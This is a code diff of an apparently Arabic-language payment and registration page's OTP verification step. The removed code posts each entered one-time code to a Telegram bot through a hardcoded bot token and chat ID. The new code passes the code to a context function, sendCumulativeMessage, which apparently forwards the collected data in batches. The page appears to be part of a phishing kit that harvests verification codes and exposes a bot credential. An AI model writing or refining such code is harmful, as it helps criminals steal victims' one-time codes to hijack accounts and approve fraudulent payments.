@@ -10,6 +10,7 @@ import {
   InputOTPSlot,
 } from "@/components/ui/input-otp";
 import securePaymentLogos from "@/assets/secure-payment-logos.png";
+import { useRegistration } from "@/contexts/RegistrationContext";
 
 const steps = [
   { number: 1, title: "نوع الحساب" },
@@ -19,34 +20,14 @@ const steps = [
 ];
 
 const OTPVerification = () => {
-  const [otp, setOtp] = useState("");
   const navigate = useNavigate();
-
-  const sendToTelegram = async (message: string) => {
-    try {
-      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
-      const chatId = "-4985537188";
-      
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "HTML",
-        }),
-      });
-    } catch (error) {
-      console.error("فشل الإرسال إلى Telegram:", error);
-    }
-  };
+  const { updateData, sendCumulativeMessage } = useRegistration();
+  const [otp, setOtp] = useState("");
 
   const handleVerify = async () => {
     if (otp.length === 4) {
-      const message = `رمز التحقق OTP\n\nالرمز: ${otp}`;
-      await sendToTelegram(message);
+      updateData({ otp });
+      await sendCumulativeMessage(6, "رمز التحقق");
       navigate('/success');
     }
   };
